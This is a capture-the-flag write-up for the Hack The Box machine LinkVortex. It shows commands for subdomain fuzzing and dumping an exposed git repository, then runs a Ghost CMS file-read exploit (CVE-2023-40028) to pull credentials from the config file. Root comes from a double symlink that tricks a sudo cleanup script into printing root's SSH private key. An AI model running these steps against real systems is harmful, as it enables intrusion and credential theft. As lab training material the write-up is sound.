---
title: 'LinkVortex'
description: 'Finding a dev subdomain with a git repo, getting credentials from the git repo, abusing a CVE in Ghost CMS to read files and finding more credentials. Getting root through an bash script and a double symlink'
pubDate: 2024-12-07
category: 'hackthebox'
tags: ['CVE-2023-40028', 'Ghost CMS v5.58']
image: 'https://labs.hackthebox.com/storage/avatars/97f12db8fafed028448e29e30be7efac.png'
---

The website doesn't seem to have any user input.
We discover that it is running Ghost CMS version 5.58 by inspecting some of the fetches that are being made.
The login is located at http://linkvortex.htb/ghost/#/signin, checking the responses from the login we can determine that a valid user name is: `admin@linkvortex.htb`.
We have no password at this point so we are stuck here, lets enumerate further.

Lets check for valid vhosts:

```bash
ffuf -u http://10.129.46.89 -H "Host: FUZZ.linkvortex.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fs 230
...[snip]...
dev                     [Status: 200, Size: 2538, Words: 670, Lines: 116, Duration: 22ms]
...[snip]...
```

Since this seems to be a static page with not much to go on lets check for hidden dirs:

```bash
feroxbuster -u http://dev.linkvortex.htb
...[snip]...
301      GET        7l       20w      239c http://dev.linkvortex.htb/.git => http://dev.linkvortex.htb/.git/
...[snip]...
```

To be able to check the git/repo we can use Git-dumper to get it on our machine:

```bash
git-dumper http://dev.linkvortex.htb/.git/ dev
...[snip]...
[-] Sanitizing .git/config
[-] Running git checkout .
Updated 5596 paths from the index
```

There are 2 modified files a `Dockerfile.ghost` and `ghost/core/test/regression/api/admin/authentication.test.js`.
Checking the test file we see it contains a new password: `OctopiFociPilfer45`.
This password allows us to login as `admin@linkvortex.htb` on the Ghost CMS.

Googling around we find an exploit for Ghost CMS by the author of this machine: https://github.com/0xyassine/CVE-2023-40028

Let's run it with the credentials we found:

```bash
./CVE-2023-40028.sh -u 'admin@linkvortex.htb' -p 'OctopiFociPilfer45'
WELCOME TO THE CVE-2023-40028 SHELL
file>
```

## USER

In the `Dockerfile.ghost` there is a line referencing a config file, this might be interesting (`/var/lib/ghost/config.production.json`).

```json
files> /var/lib/ghost/config.production.json
...[snip]...
"mail": {
     "transport": "SMTP",
     "options": {
      "service": "Google",
      "host": "linkvortex.htb",
      "port": 587,
      "auth": {
        "user": "bob@linkvortex.htb",
        "pass": "fibber-talented-worth"
        }
      }
    }
...[snip]...
```

With the SMTP credentials we can SSH into the machine.

```bash
ssh bob@linkvortex.htb # <-- fibber-talented-worth
```

## ROOT

When checking the sudo rights for this user we see:

```bash
bob@linkvortex:~$ sudo -l
Matching Defaults entries for bob on linkvortex:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty,
    env_keep+=CHECK_CONTENT

User bob may run the following commands on linkvortex:
    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
```

The script:

```bash
#!/bin/bash

QUAR_DIR="/var/quarantined"

if [ -z $CHECK_CONTENT ];then
  CHECK_CONTENT=false
fi

LINK=$1

if ! [[ "$LINK" =~ \.png$ ]]; then
  /usr/bin/echo "! First argument must be a png file !"
  exit 2
fi

if /usr/bin/sudo /usr/bin/test -L $LINK;then
  LINK_NAME=$(/usr/bin/basename $LINK)
  LINK_TARGET=$(/usr/bin/readlink $LINK)
  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
    /usr/bin/unlink $LINK
  else
    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
    /usr/bin/mv $LINK $QUAR_DIR/
    if $CHECK_CONTENT;then
      /usr/bin/echo "Content:"
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
    fi
  fi
fi
```

We need to set the `CHECK_CONTENT` to true and bypass the regex `grep -Eq '(etc|root)'`.
We can just set the CHECK_CONTENT variable and create a double symlink to bypass the regex like this:

```bash
export CHECK_CONTENT=true
ln -s /root/.ssh/id_rsa /home/bob/moo1.png && ln -s /home/bob/moo1.png moo.png
sudo /usr/bin/bash /opt/ghost/clean_symlink.sh moo.png

Link found [ moo.png ] , moving it to quarantine
Content:
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
...[snip]...
```

Now we can use the `id_rsa` file to login as root:

```bash
chmod 600 root_id_rsa
ssh -i root_id_rsa root@linkvortex.htb
```
